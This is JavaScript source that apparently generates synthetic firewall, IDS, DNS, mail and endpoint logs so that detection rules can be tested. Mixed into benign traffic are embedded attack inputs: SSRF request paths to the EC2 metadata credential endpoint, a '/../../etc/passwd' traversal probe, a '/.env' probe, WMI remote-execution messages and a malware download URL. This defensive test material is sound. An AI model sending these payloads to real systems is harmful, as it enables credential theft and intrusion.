              'ParentImage="C:\\Windows\\System32\\cmd.exe"', 'IntegrityLevel="High"'],
            message: `Process Create: wmic.exe /node:${tgt} process call create — remote execution via WMI`,
          }),
          sym(h, 4, 3, 'Network connect', {
            image: 'C:\\Windows\\System32\\wbem\\WMIC.exe', userDomain: `CORP\\${u}`,
            srcIp: h.ip, dstIp: tgt, srcPort: rand.int(49152, 65535), dstPort: 135,
            sysmonFields: ['Protocol="tcp"', `SourceIp="${h.ip}"`, `DestinationIp="${tgt}"`,
              'DestinationPort=135', 'DestinationPortName="epmap"', 'Initiated="true"'],
            message: `Network connect: wmic.exe ${h.ip} -> ${tgt}:135 (DCOM/RPC endpoint mapper)`,
          }),
        ];
      },
    },

    // ---- Web ------------------------------------------------------------------
    'ssrf-metadata': {
      label: 'SSRF → Cloud Metadata', category: 'attack',
      build() {
        const h = rand.pick(HOSTS.web), a = rand.pick(THREAT_INTEL.ips);
        // 169.254.169.254 is the EC2 instance metadata service: reachable only
        // from the instance, so an SSRF turns it into an IAM credential vending
        // machine for whoever controls the request.
        return [
          '/api/v1/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/',
          '/proxy?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-app-role',
        ].slice(0, rand.int(1, 2)).map((u) => web(h, 3, a, 'GET', u, { status: 200 }));
      },
    },
  };
  Object.assign(SCENARIOS, MORE_ATTACKS);

  // ---- Appliance log sources ------------------------------------------------
  // The most common security-appliance formats. Each burst mixes benign traffic
  // with one malicious event so both the native format and a detection show up.
  const APPLIANCE = {
    paloalto: {
      label: 'Palo Alto (PAN-OS)', category: 'appliance',
      build() {
        const host = rand.pick(['PA-3220', 'PA-VM-01', 'PA-850']);
        const serial = String(rand.int(100000000000, 999999999999));
        const base = () => ({ srcType: 'paloalto', vendor: 'paloalto', host, serial, facility: FACILITY.local0, program: 'paloalto' });
        const evs = [];
        for (let i = 0, n = rand.int(3, 5); i < n; i++) {
          const proto = rand.pick(['tcp', 'udp']);
          const src = rand.internalIp(), dst = rand.ip(), sport = rand.int(1024, 65535), dport = rand.pick([443, 80, 53, 22, 8080]);
          const app = rand.pick(['web-browsing', 'ssl', 'dns', 'ssh', 'ntp']);
          evs.push(Object.assign(base(), {
            severity: 6, panType: 'TRAFFIC', subtype: rand.pick(['start', 'end']),
            srcIp: src, dstIp: dst, srcPort: sport, dstPort: dport, proto, action: 'allow', app,
            rule: 'trust-to-untrust', fromZone: 'trust', toZone: 'untrust',
            sessionId: rand.int(10000, 999999), bytes: rand.int(500, 60000),
            message: `TRAFFIC allow ${app} ${src}:${sport} -> ${dst}:${dport}`,
          }));
        }
        const threat = rand.pick([
          ['Apache Log4j Remote Code Execution Vulnerability', 91991, 'code-execution'],
          ['SQL Injection Attempt Detected', 20568, 'sql-injection'],
          ['Microsoft Windows SMBv1 RCE (EternalBlue)', 40007, 'code-execution'],
          ['HTTP Directory Traversal Attempt', 31337, 'info-leak'],
        ]);
        const badSrc = rand.pick(THREAT_INTEL.ips), vic = rand.internalIp(), panSev = rand.pick(['high', 'critical']);
        evs.push(Object.assign(base(), {
          severity: panSev === 'critical' ? 2 : 3, panType: 'THREAT', subtype: 'vulnerability',
          srcIp: badSrc, dstIp: vic, srcPort: rand.int(1024, 65535), dstPort: 443, proto: 'tcp',
          action: rand.pick(['reset-both', 'drop', 'alert']), app: 'web-browsing',
          rule: 'untrust-to-dmz', fromZone: 'untrust', toZone: 'dmz', sessionId: rand.int(10000, 999999),
          threatName: threat[0], threatId: threat[1], category: threat[2], panSeverity: panSev,
          threatSig: threat[0], threatSev: panSev === 'critical' ? 'critical' : 'high',
          message: `THREAT [${panSev}] ${threat[0]} ${badSrc} -> ${vic}`,
        }));
        return evs;
      },
    },
    fortigate: {
      label: 'FortiGate (FortiOS)', category: 'appliance',
      build() {
        const devname = rand.pick(['FGT60F', 'FG100E', 'FGT-DC-01']);
        const devid = `FGT${rand.int(10000, 99999)}TK${rand.int(1000000, 9999999)}`;
        const base = () => ({ srcType: 'fortigate', vendor: 'fortigate', host: devname, devname, devid, facility: FACILITY.local4, program: 'fortigate' });
        const evs = [];
        for (let i = 0, n = rand.int(3, 5); i < n; i++) {
          const proto = rand.pick(['tcp', 'udp']);
          const src = rand.internalIp(), dst = rand.ip(), dport = rand.pick([443, 80, 53, 123]);
          const service = rand.pick(['HTTPS', 'HTTP', 'DNS', 'NTP']);
          evs.push(Object.assign(base(), {
            severity: 5, logid: '0000000013', ftType: 'traffic', subtype: 'forward', level: 'notice',
            srcIp: src, dstIp: dst, srcPort: rand.int(1024, 65535), dstPort: dport,
            proto, protoNum: proto === 'tcp' ? 6 : 17, action: 'accept', policyid: rand.int(1, 50), service,
            sentbyte: rand.int(500, 80000), rcvdbyte: rand.int(500, 120000), duration: rand.int(1, 300),
            message: `traffic accept ${src} -> ${dst}:${dport} (${service})`,
          }));
        }
        const attack = rand.pick([
          ['Apache.Log4j.Error.Remote.Code.Execution', 51006],
          ['MS.SMB.Server.Trans.Peeking.Data.OOB.Read', 41435],
          ['Backdoor.Cobalt.Strike.Beacon', 46774],
          ['HTTP.URI.SQL.Injection', 15621],
        ]);
        const badSrc = rand.pick(THREAT_INTEL.ips), vic = rand.internalIp(), level = rand.pick(['critical', 'alert']);
        evs.push(Object.assign(base(), {
          severity: level === 'alert' ? 1 : 2, logid: '0419016384', ftType: 'utm', subtype: 'ips', level,
          srcIp: badSrc, dstIp: vic, srcPort: rand.int(1024, 65535), dstPort: 443, proto: 'tcp', protoNum: 6,
          action: 'dropped', policyid: rand.int(1, 50), service: 'HTTPS', attack: attack[0], attackId: attack[1],
          threatSig: attack[0], threatSev: /alert|critical/i.test(level) ? 'critical' : 'high',
          message: `ips dropped ${attack[0]} ${badSrc} -> ${vic}`,
        }));
        return evs;
      },
    },
    ciscoasa: {
      label: 'Cisco ASA', category: 'appliance',
      build() {
        const host = rand.pick(['ASA-5516', 'ASA-FW01', 'ciscoasa']);
        const base = () => ({ srcType: 'ciscoasa', vendor: 'ciscoasa', host, facility: FACILITY.local4, program: 'ASA', proto: 'tcp' });
        const evs = [];
        for (let i = 0, n = rand.int(3, 5); i < n; i++) {
          const src = rand.internalIp(), dst = rand.ip(), sport = rand.int(1024, 65535), dport = rand.pick([443, 80, 53]);
          const id = rand.int(100000, 999999), built = rand.chance(0.6);
          evs.push(Object.assign(base(), {
            severity: 6, srcIp: src, dstIp: dst, srcPort: sport, dstPort: dport, action: 'allow',
            msgId: built ? '302013' : '302014',
            message: built
              ? `Built outbound TCP connection ${id} for outside:${dst}/${dport} (${dst}/${dport}) to inside:${src}/${sport} (${src}/${sport})`
              : `Teardown TCP connection ${id} for outside:${dst}/${dport} to inside:${src}/${sport} duration 0:0:${rand.int(1, 59)} bytes ${rand.int(500, 90000)}`,
          }));
        }
        // Outbound to a known-bad IP (fires the C2 rule).
        const badDst = rand.pick(THREAT_INTEL.ips), internal = rand.internalIp(), id = rand.int(100000, 999999), sp = rand.int(1024, 65535);
        evs.push(Object.assign(base(), {
          severity: 6, srcIp: internal, dstIp: badDst, srcPort: sp, dstPort: 443, action: 'allow', msgId: '302013',
          message: `Built outbound TCP connection ${id} for outside:${badDst}/443 (${badDst}/443) to inside:${internal}/${sp}`,
        }));
        // Inbound deny.
        const badSrc = rand.pick(THREAT_INTEL.ips), vic = rand.internalIp(), sp2 = rand.int(1024, 65535), dp = rand.pick([22, 3389, 445]);
        evs.push(Object.assign(base(), {
          severity: 4, srcIp: badSrc, dstIp: vic, srcPort: sp2, dstPort: dp, action: 'deny', msgId: '106023',
          message: `Deny tcp src outside:${badSrc}/${sp2} dst inside:${vic}/${dp} by access-group "outside_access_in"`,
        }));
        return evs;
      },
    },
    checkpoint: {
      label: 'Check Point', category: 'appliance',
      build() {
        const host = rand.pick(['cp-gw-01', 'fw-mgmt', 'checkpoint-01']);
        const product = rand.pick(['VPN-1 & FireWall-1', 'Threat Emulation', 'SmartDefense']);
        const base = () => ({ srcType: 'checkpoint', vendor: 'checkpoint', host, product, facility: FACILITY.local4, program: 'CheckPoint', proto: 'tcp' });
        const evs = [];
        for (let i = 0, n = rand.int(3, 5); i < n; i++) {
          const src = rand.internalIp(), dst = rand.ip(), dport = rand.pick([443, 80, 53]);
          evs.push(Object.assign(base(), {
            severity: 6, srcIp: src, dstIp: dst, srcPort: rand.int(1024, 65535), dstPort: dport,
            action: 'Accept', rule: String(rand.int(1, 60)),
            message: `Accept ${src} -> ${dst}:${dport}`,
          }));
        }
        const badDst = rand.pick(THREAT_INTEL.ips), internal = rand.internalIp();
        evs.push(Object.assign(base(), {
          severity: 4, srcIp: internal, dstIp: badDst, srcPort: rand.int(1024, 65535), dstPort: 443,
          action: 'Accept', rule: String(rand.int(1, 60)),
          message: `Accept ${internal} -> ${badDst}:443 (flagged destination)`,
        }));
        const badSrc = rand.pick(THREAT_INTEL.ips), vic = rand.internalIp();
        evs.push(Object.assign(base(), {
          severity: 4, srcIp: badSrc, dstIp: vic, srcPort: rand.int(1024, 65535), dstPort: rand.pick([445, 3389]),
          action: 'Drop', rule: String(rand.int(1, 60)),
          message: `Drop ${badSrc} -> ${vic}`,
        }));
        return evs;
      },
    },
    sophos: {
      label: 'Sophos XG', category: 'appliance',
      build() {
        const host = rand.pick(['XG135', 'SFW-DC', 'sophos-fw']);
        const base = () => ({ srcType: 'sophos', vendor: 'sophos', host, facility: FACILITY.local4, program: 'SFW', proto: 'tcp' });
        const evs = [];
        for (let i = 0, n = rand.int(3, 5); i < n; i++) {
          evs.push(Object.assign(base(), { severity: 6, action: 'Allow', priority: 'Information', ruleId: rand.int(1, 40),
            srcIp: rand.internalIp(), dstIp: rand.ip(), srcPort: rand.int(1024, 65535), dstPort: rand.pick([443, 80, 53]),
            message: 'Firewall rule allowed traffic' }));
        }
        const sig = rand.pick(['SQL-Injection-Attack', 'Web-Server-CVE-2021-44228-Log4j', 'Suspicious-Executable-Download']);
        evs.push(Object.assign(base(), { severity: 2, action: 'Deny', priority: 'Warning', ruleId: rand.int(1, 40),
          srcIp: rand.pick(THREAT_INTEL.ips), dstIp: rand.internalIp(), srcPort: rand.int(1024, 65535), dstPort: 443,
          threatSig: sig, threatSev: 'critical', threatId: rand.int(10000, 99999), message: `IPS ${sig}` }));
        return evs;
      },
    },
    pfsense: {
      label: 'pfSense', category: 'appliance',
      build() {
        const host = rand.pick(['pfsense', 'opnsense-01']);
        const base = () => ({ srcType: 'pfsense', vendor: 'pfsense', host, facility: FACILITY.local0, program: 'filterlog', proto: 'tcp', protoNum: 6 });
        const evs = [];
        for (let i = 0, n = rand.int(3, 5); i < n; i++) {
          const block = rand.chance(0.4);
          evs.push(Object.assign(base(), { severity: block ? 5 : 6, action: block ? 'block' : 'pass', direction: 'in', ruleId: rand.int(1, 20),
            srcIp: rand.chance(0.5) ? rand.ip() : rand.internalIp(), dstIp: rand.internalIp(),
            srcPort: rand.int(1024, 65535), dstPort: rand.pick([443, 80, 22]), message: block ? 'filterlog block in' : 'filterlog pass in' }));
        }
        const badDst = rand.pick(THREAT_INTEL.ips), internal = rand.internalIp();
        evs.push(Object.assign(base(), { severity: 5, action: 'pass', direction: 'out', ruleId: rand.int(1, 20),
          srcIp: internal, dstIp: badDst, srcPort: rand.int(1024, 65535), dstPort: 443,
          message: `filterlog pass out to flagged ${badDst}` }));
        return evs;
      },
    },
    juniper: {
      label: 'Juniper SRX', category: 'appliance',
      build() {
        const host = rand.pick(['srx-edge-01', 'srx-dc']);
        const base = () => ({ srcType: 'juniper', vendor: 'juniper', host, facility: FACILITY.local4, program: 'RT_FLOW', proto: 'tcp' });
        const evs = [];
        for (let i = 0, n = rand.int(3, 5); i < n; i++) {
          const deny = rand.chance(0.3);
          evs.push(Object.assign(base(), { severity: deny ? 5 : 6, action: deny ? 'deny' : 'permit',
            srcIp: rand.chance(0.5) ? rand.ip() : rand.internalIp(), dstIp: rand.internalIp(),
            srcPort: rand.int(1024, 65535), dstPort: rand.pick([443, 80, 53]), service: rand.pick(['junos-https', 'junos-dns', 'junos-http']),
            policy: deny ? 'default-deny' : 'trust-to-untrust', message: `RT_FLOW session ${deny ? 'denied' : 'created'}` }));
        }
        const badDst = rand.pick(THREAT_INTEL.ips), internal = rand.internalIp();
        evs.push(Object.assign(base(), { severity: 5, action: 'permit', srcIp: internal, dstIp: badDst, fromZone: 'trust', toZone: 'untrust',
          srcPort: rand.int(1024, 65535), dstPort: 443, service: 'junos-https', policy: 'permit-outbound',
          message: `RT_FLOW session created to flagged ${badDst}` }));
        return evs;
      },
    },
    sonicwall: {
      label: 'SonicWall', category: 'appliance',
      build() {
        const host = rand.pick(['SNWL-TZ', 'sonicwall-01']);
        const base = () => ({ srcType: 'sonicwall', vendor: 'sonicwall', host, hostIp: '10.0.0.1', facility: FACILITY.local0, program: 'sonicwall', proto: 'tcp', serial: '0006B1' + rand.int(100000, 999999) });
        const evs = [];
        for (let i = 0, n = rand.int(3, 5); i < n; i++) {
          evs.push(Object.assign(base(), { severity: 6, category: 1024, msgId: 97, action: 'allow',
            srcIp: rand.internalIp(), dstIp: rand.ip(), srcPort: rand.int(1024, 65535), dstPort: rand.pick([443, 80]),
            message: 'Connection Opened' }));
        }
        const sig = rand.pick(['IPS Detection Alert: Suspected Port Scan', 'Possible SYN Flood', 'Malformed packet dropped']);
        evs.push(Object.assign(base(), { severity: 2, category: 32, msgId: 82, action: 'deny',
          srcIp: rand.pick(THREAT_INTEL.ips), dstIp: rand.internalIp(), srcPort: rand.int(1024, 65535), dstPort: 443,
          threatSig: sig, threatSev: 'high', message: sig }));
        return evs;
      },
    },
    zscaler: {
      label: 'Zscaler ZIA', category: 'appliance',
      build() {
        const host = 'zscaler-nss', base = () => ({ srcType: 'zscaler', vendor: 'zscaler', host, facility: FACILITY.local5, program: 'zscalernss', proto: 'tcp' });
        const evs = [];
        for (let i = 0, n = rand.int(3, 5); i < n; i++) {
          evs.push(Object.assign(base(), { severity: 6, action: 'Allowed', category: rand.pick(['Business', 'News', 'Search Engines']), method: 'GET', status: 200,
            user: rand.pick(USERS) + '@corp', srcIp: rand.internalIp(), dstIp: rand.ip(),
            srcPort: rand.int(1024, 65535), dstPort: 443, url: rand.pick(['https://portal.example.com', 'https://news.example.net', 'https://docs.corp.local']),
            message: 'web request allowed' }));
        }
        const sig = rand.pick(['Win32.Trojan.Emotet', 'JS.Downloader.GenericKD', 'EICAR-Test-File', 'Phishing.Kit.Generic']);
        evs.push(Object.assign(base(), { severity: 2, action: 'Blocked', category: 'Malware', urlClass: 'Security Risk', method: 'GET', status: 403,
          user: rand.pick(USERS) + '@corp', srcIp: rand.internalIp(), dstIp: rand.pick(THREAT_INTEL.ips),
          srcPort: rand.int(1024, 65535), dstPort: 443, url: 'http://malware-cdn.top/payload.exe',
          threatSig: sig, threatSev: 'critical', message: `blocked malware download (${sig})` }));
        return evs;
      },
    },
    f5: {
      label: 'F5 BIG-IP ASM', category: 'appliance',
      build() {
        const host = rand.pick(['bigip-asm-01', 'f5-waf']);
        const base = () => ({ srcType: 'f5', vendor: 'f5', host, hostIp: '10.0.0.5', facility: FACILITY.local4, program: 'ASM', proto: 'tcp', app: 'shop', policy: 'prod_waf' });
        const evs = [];
        for (let i = 0, n = rand.int(2, 4); i < n; i++) {
          evs.push(Object.assign(base(), { severity: 6, action: 'passed', status: 200, method: 'GET', url: rand.pick(['/', '/cart', '/api/v1/orders']),
            srcIp: rand.ip(), dstIp: '10.10.1.11', srcPort: rand.int(1024, 65535), dstPort: 443, sevName: 'Informational', message: 'request passed WAF policy' }));
        }
        const sig = rand.pick(['SQL-Injection', 'Cross-Site-Scripting-(XSS)', 'Command-Execution', 'Predictable-Resource-Location']);
        evs.push(Object.assign(base(), { severity: 2, action: 'blocked', status: 0, method: 'POST', url: '/login',
          srcIp: rand.pick(THREAT_INTEL.ips), dstIp: '10.10.1.11', srcPort: rand.int(1024, 65535), dstPort: 443,
          threatSig: sig, threatSev: 'high', sevName: 'Critical', message: `WAF blocked ${sig}` }));
        return evs;
      },
    },
    ciscoftd: {
      label: 'Cisco FTD (Firepower)', category: 'appliance',
      build() {
        const host = rand.pick(['ftd-edge-01', 'firepower', 'FTD-DC-02']);
        const base = () => ({ srcType: 'ciscoftd', vendor: 'ciscoftd', host, facility: FACILITY.local4, program: 'FTD', policy: 'Corp_Access_Control' });
        const evs = [];
        for (let i = 0, n = rand.int(3, 5); i < n; i++) {
          const proto = rand.pick(['tcp', 'udp']);
          evs.push(Object.assign(base(), {
            severity: 6, ftdMsgId: '430002', action: 'Allow', proto,
            srcIp: rand.internalIp(), dstIp: rand.ip(), srcPort: rand.int(1024, 65535), dstPort: rand.pick([443, 80, 53]),
            fromZone: 'Inside', toZone: 'Outside', rule: rand.pick(['Allow_Web_Outbound', 'Allow_DNS', 'Permit_Corp_HTTPS']),
            message: 'connection allowed',
          }));
        }
        const intr = rand.pick([
          ['SERVER-WEBAPP Apache Log4j arbitrary code execution attempt', 58722, 'Attempted User Privilege Gain'],
          ['MALWARE-CNC Win.Trojan.Emotet outbound connection', 47332, 'A Network Trojan was detected'],
          ['SERVER-WEBAPP SQL injection attempt', 41274, 'Web Application Attack'],
        ]);
        const badSrc = rand.pick(THREAT_INTEL.ips), vic = rand.internalIp();
        evs.push(Object.assign(base(), {
          severity: 1, ftdMsgId: '430001', action: 'Blocked', proto: 'tcp',
          srcIp: badSrc, dstIp: vic, srcPort: rand.int(1024, 65535), dstPort: 443,
          fromZone: 'Outside', toZone: 'DMZ', gid: 1, sid: intr[1], classification: intr[2], priority: 1,
          sigName: intr[0], threatSig: intr[0], threatSev: 'critical', message: `intrusion blocked: ${intr[0]}`,
        }));
        return evs;
      },
    },
    ciscoise: {
      label: 'Cisco ISE (RADIUS)', category: 'appliance',
      build() {
        const host = rand.pick(['ise-psn-01', 'ise-node-02']);
        const nasName = rand.pick(['WLC-CORP-01', 'SW-ACCESS-3850', 'WLC-GUEST-02']);
        const nasIp = '10.0.0.' + rand.int(20, 60);
        const mac = Array.from({ length: 6 }, () => rand.int(0, 255).toString(16).padStart(2, '0').toUpperCase()).join('-');
        const base = () => ({
          srcType: 'ciscoise', vendor: 'ciscoise', host, facility: FACILITY.local6, program: 'CISE',
          nasName, nasIp, mac, hostIp: '10.10.0.30', configVersion: rand.int(5, 40),
          portType: rand.pick(['Wireless - IEEE 802.11', 'Ethernet']), totalSeg: 1, segNum: 0,
          srcIp: nasIp, dstIp: '10.10.0.30', srcPort: rand.int(1024, 65535), dstPort: 1812,
        });
        const evs = [];
        for (let i = 0, n = rand.int(3, 5); i < n; i++) {
          evs.push(Object.assign(base(), {
            severity: 5, iseCategory: 'CISE_Passed_Authentications', msgCode: 5200, iseSev: 'NOTICE',
            iseDesc: 'Passed-Authentication: Authentication succeeded',
            iseSeq: rand.int(1, 999999), iseId: rand.int(1, 9999999),
            user: rand.pick(USERS) + '@corp.local',
            message: '802.1X authentication succeeded',
          }));
        }
        // Repeated RADIUS rejects for one MAC — 802.1X credential guessing. No
        // threatSig here: the burst is the signal, so the radius-brute rule
        // correlates it and alerts once rather than once per failed attempt.
        const badUser = rand.pick(BAD_USERS);
        const reason = rand.pick([
          '22040 Wrong password or invalid shared secret',
          '22056 Subject not found in the applicable identity store(s)',
        ]);
        for (let i = 0; i < rand.int(7, 10); i++) {
          evs.push(Object.assign(base(), {
            severity: 3, iseCategory: 'CISE_Failed_Attempts', msgCode: 5400, iseSev: 'NOTICE',
            iseDesc: 'Failed-Attempt: Authentication failed',
            iseSeq: rand.int(1, 999999), iseId: rand.int(1, 9999999),
            user: badUser + '@corp.local', failReason: reason,
            message: `802.1X authentication failed for ${badUser} (${reason})`,
          }));
        }
        return evs;
      },
    },
    snort: {
      label: 'Snort 3 (IDS)', category: 'appliance',
      build() {
        const host = rand.pick(['snort-sensor-01', 'ids-inline-02']);
        const dpid = rand.int(1000, 200000); // one snort process per sensor
        const base = () => ({ srcType: 'snort', vendor: 'snort', host, facility: FACILITY.local7, program: 'snort', pid: dpid, gid: 1, proto: 'tcp' });
        const evs = [];
        // Priority-3 noise: no threatSig, so it renders without raising an alert.
        for (let i = 0, n = rand.int(2, 3); i < n; i++) {
          evs.push(Object.assign(base(), {
            severity: 6, sid: 408, rev: rand.int(1, 6), proto: 'icmp',
            sigName: 'PROTOCOL-ICMP Echo Reply', classification: 'Misc Activity', priority: 3,
            srcIp: rand.internalIp(), dstIp: rand.ip(),
            message: 'low-priority IDS event',
          }));
        }
        const alert = rand.pick([
          ['SERVER-WEBAPP Apache Log4j arbitrary code execution attempt', 58722, 'Attempted User Privilege Gain'],
          ['MALWARE-CNC Win.Trojan.Cobalt Strike beacon outbound', 29889, 'A Network Trojan was detected'],
          ['INDICATOR-SCAN SSH brute force login attempt', 19559, 'Misc Attack'],
          ['SQL union select possible sql injection attempt', 13990, 'Web Application Attack'],
        ]);
        evs.push(Object.assign(base(), {
          severity: 1, sid: alert[1], rev: rand.int(1, 12),
          sigName: alert[0], threatSig: alert[0], classification: alert[2], priority: 1, threatSev: 'critical',
          srcIp: rand.pick(THREAT_INTEL.ips), dstIp: rand.internalIp(),
          srcPort: rand.int(1024, 65535), dstPort: rand.pick([443, 80, 22]),
          message: `IDS alert: ${alert[0]}`,
        }));
        return evs;
      },
    },
    haproxy: {
      label: 'HAProxy', category: 'appliance',
      build() {
        const host = rand.pick(['lb-edge-01', 'haproxy-02']);
        const dpid = rand.int(1000, 30000); // one haproxy process per LB
        const base = () => ({
          srcType: 'haproxy', vendor: 'haproxy', host, facility: FACILITY.local0, program: 'haproxy',
          pid: dpid, frontend: 'http-in', reqHeaders: 'shop.example.com', proto: 'tcp',
          dstIp: '10.0.0.80', dstPort: 443,
        });
        const evs = [];
        for (let i = 0, n = rand.int(3, 5); i < n; i++) {
          const srv = rand.pick(['srv1', 'srv2', 'srv3']);
          evs.push(Object.assign(base(), {
            severity: 6, backend: 'static', server: srv,
            timers: `${rand.int(0, 40)}/0/${rand.int(0, 30)}/${rand.int(5, 90)}/${rand.int(10, 200)}`,
            status: 200, bytes: rand.int(500, 40000), termState: '----',
            conns: `${rand.int(1, 20)}/${rand.int(1, 8)}/${rand.int(0, 4)}/${rand.int(0, 2)}/0`,
            srcIp: rand.ip(), srcPort: rand.int(1024, 65535), method: 'GET', url: rand.pick(URLS),
            message: 'request served',
          }));
        }
        // PR-- = request denied by the proxy itself (never reached a backend).
        // Only the last of the probe burst carries threatSig, so the scan raises
        // a single alert instead of one per denied request.
        const badSrc = rand.pick(THREAT_INTEL.ips);
        const probes = ['/admin/config.php', '/.env', '/wp-admin/', '/../../etc/passwd'];
        probes.forEach((url, i) => {
          const last = i === probes.length - 1;
          evs.push(Object.assign(base(), {
            severity: 4, backend: 'http-in', server: '<NOSRV>', timers: '-1/-1/-1/-1/0',
            status: 403, bytes: 188, termState: 'PR--', conns: `${rand.int(1, 20)}/1/0/0/0`,
            srcIp: badSrc, srcPort: rand.int(1024, 65535), method: 'GET', url,
            threatSig: last ? 'HAProxy ACL Denied Request Scan (PR--)' : undefined,
            threatSev: last ? 'medium' : undefined,
            message: 'request denied by proxy ACL',
          }));
        });
        return evs;
      },
    },
    bind: {
      label: 'BIND 9 (DNS)', category: 'appliance',
      build() {
        const host = 'dns-01';
        const handle = () => rand.int(0x10000000, 0x7fffffff).toString(16);
        const dpid = rand.int(500, 9000); // one named process per resolver
        const base = () => ({ srcType: 'bind', vendor: 'bind', host, facility: FACILITY.daemon, program: 'named', pid: dpid, proto: 'udp' });
        const evs = [];
        for (let i = 0, n = rand.int(3, 5); i < n; i++) {
          evs.push(Object.assign(base(), {
            severity: 6, clientHandle: handle(), srcIp: rand.internalIp(), srcPort: rand.int(1024, 65535),
            domain: rand.pick(DOMAINS), qtype: rand.pick(['A', 'AAAA', 'MX']), qflags: '+',
            message: 'dns query',
          }));
        }
        // DGA-length label + a known-bad domain — both trip the DNS rule.
        const dga = Array.from({ length: rand.int(42, 56) }, () => 'abcdefghijklmnopqrstuvwxyz0123456789'[rand.int(0, 35)]).join('');
        const vic = rand.internalIp();
        evs.push(Object.assign(base(), {
          severity: 4, clientHandle: handle(), srcIp: vic, srcPort: rand.int(1024, 65535),
          domain: `${dga}.tunnel.badnet.ru`, qtype: 'TXT', qflags: '+E(0)',
          message: 'oversized TXT query — possible tunnel',
        }));
        evs.push(Object.assign(base(), {
          severity: 3, clientHandle: handle(), srcIp: vic, srcPort: rand.int(1024, 65535),
          domain: rand.pick(THREAT_INTEL.domains), qtype: 'A', qflags: '+',
          message: 'query for known-bad domain',
        }));
        return evs;
      },
    },
    postfix: {
      label: 'Postfix (mail)', category: 'appliance',
      build() {
        const host = 'mail-gw-01';
        const base = () => ({ srcType: 'postfix', vendor: 'postfix', host, facility: FACILITY.mail, program: 'postfix', pid: rand.int(1000, 30000), proto: 'tcp', dstIp: '10.10.0.25', dstPort: 25 });
        const evs = [];
        for (let i = 0, n = rand.int(2, 4); i < n; i++) {
          evs.push(Object.assign(base(), {
            severity: 6, pfProc: 'smtp', pfAction: 'sent', queueId: rand.id().toUpperCase().slice(0, 10),
            to: `${rand.pick(USERS)}@corp.local`, relay: 'mx.corp.local[10.10.0.25]:25',
            delay: rand.float(0.1, 3).toFixed(1), srcIp: rand.internalIp(), srcPort: rand.int(1024, 65535),
            message: 'mail delivered',
          }));
        }
        const badIp = rand.pick(THREAT_INTEL.ips);
        const rej = rand.pick([
          [554, 'Service unavailable; Client host [IP] blocked using sbl-xbl.spamhaus.org', 'Spamhaus Blocklist Hit'],
          [550, 'Sender address rejected: Domain not found', 'Invalid Sender Domain'],
        ]);
        // Only the final reject carries threatSig — one alert per burst.
        const n = rand.int(3, 5);
        for (let i = 0; i < n; i++) {
          const last = i === n - 1;
          evs.push(Object.assign(base(), {
            severity: 4, pfProc: 'smtpd', pfAction: 'reject', smtpCode: rej[0],
            pfReason: rej[1].replace('[IP]', `[${badIp}]`), clientHost: 'unknown',
            srcIp: badIp, srcPort: rand.int(1024, 65535),
            from: `${rand.id()}@${rand.pick(['superig.com.br', 'mail.dark-pool.su', 'bounce.badnet.ru'])}`,
            to: `${rand.pick(USERS)}@corp.local`, helo: `Static-IP-${badIp.replace(/\./g, '')}`,
            threatSig: last ? rej[2] : undefined, threatSev: last ? 'medium' : undefined,
            message: `mail rejected from ${badIp} (${rej[2]})`,
          }));
        }
        return evs;
      },
    },
    snare: {
      // Not native syslog — Windows needs a Snare/NXLog agent to relay the
      // Event Log, so this source declares transport 'agent'.
      label: 'Windows Event Log (Snare)', category: 'appliance', transport: 'agent',
      build() {
        const h = rand.pick(HOSTS.windows);
        let counter = rand.int(8000, 60000);
        const base = () => ({
          srcType: 'snare', vendor: 'snare', host: h.name, hostIp: h.ip,
          facility: FACILITY.local7, program: 'MSWinEventLog', logName: 'Security',
          sourceName: 'Microsoft-Windows-Security-Auditing', sidType: 'N/A',
          snareCounter: counter++,
        });
        const evs = [];
        for (let i = 0, n = rand.int(2, 4); i < n; i++) {
          const user = rand.pick(USERS);
          evs.push(Object.assign(base(), {
            severity: 6, criticality: 1, eventId: 4624, logType: 'Success Audit',
            categoryStr: 'Logon', user,
            message: `An account was successfully logged on. Account Name: ${user} Logon Type: 3 Source Network Address: ${rand.internalIp()}`,
          }));
        }
        evs.push(Object.assign(base(), {
          severity: 6, criticality: 1, eventId: 4688, logType: 'Success Audit',
          categoryStr: 'Process Creation', user: rand.pick(USERS),
          message: 'A new process has been created. New Process Name: C:\\Windows\\System32\\notepad.exe',
        }));
        // 4625 burst from one address for one account — the existing
        // windows-threat rule correlates it (>=8 / 60s) and alerts once.
        const badSrc = rand.pick(THREAT_INTEL.ips), target = rand.pick(BAD_USERS);
        for (let i = 0; i < rand.int(9, 12); i++) {
          evs.push(Object.assign(base(), {
            severity: 4, criticality: 4, eventId: 4625, logType: 'Failure Audit',
            categoryStr: 'Logon', user: target, srcIp: badSrc,
            message: `An account failed to log on. Account Name: ${target} Logon Type: 3 Failure Reason: Unknown user name or bad password. Source Network Address: ${badSrc} Status: 0xC000006D`,
          }));
        }
        return evs;
      },
    },
    auditd: {
      // Not native syslog — auditd reaches a collector via the audisp-syslog
      // plugin, so this source declares transport 'agent'.
      label: 'Linux auditd', category: 'appliance', transport: 'agent',
      build() {
        const h = rand.pick(HOSTS.ssh);
        // audispd is a single relay process, so its pid is constant per host.
        const relayPid = rand.int(600, 4000);
        const base = () => ({
          srcType: 'auditd', vendor: 'auditd', host: h.name, hostIp: h.ip,
          facility: FACILITY.user, program: 'audispd', pid: relayPid,
        });
        const evs = [];
        // Benign: an unprivileged user running an ordinary command. Each event is a
        // SYSCALL + EXECVE pair sharing one audit(ts:serial) — same stamp, same serial.
        for (let i = 0, n = rand.int(2, 3); i < n; i++) {
          const serial = rand.int(1000, 9999);
          const at = Date.now() - rand.int(0, 4000);
          const cmd = rand.pick([['cat', '/etc/hostname'], ['ls', '-la'], ['grep', 'error']]);
          const pid = rand.int(10000, 30000);
          evs.push(Object.assign(base(), {
            severity: 5, auditType: 'SYSCALL', auditSerial: serial, auditTs: at, auid: 1000, uid: 1000, comm: cmd[0],
            auditBody: `arch=c000003e syscall=59 success=yes exit=0 ppid=${rand.int(1000, 9999)} pid=${pid} auid=1000 uid=1000 gid=1000 euid=1000 tty=pts1 ses=3 comm="${cmd[0]}" exe="/usr/bin/${cmd[0]}" key="procmon"`,
            message: `SYSCALL execve comm="${cmd[0]}" auid=1000 uid=1000`,
          }));
          evs.push(Object.assign(base(), {
            severity: 5, auditType: 'EXECVE', auditSerial: serial, auditTs: at,
            auditBody: `argc=2 a0="${cmd[0]}" a1="${cmd[1]}"`,
            message: `EXECVE ${cmd[0]} ${cmd[1]}`,
          }));
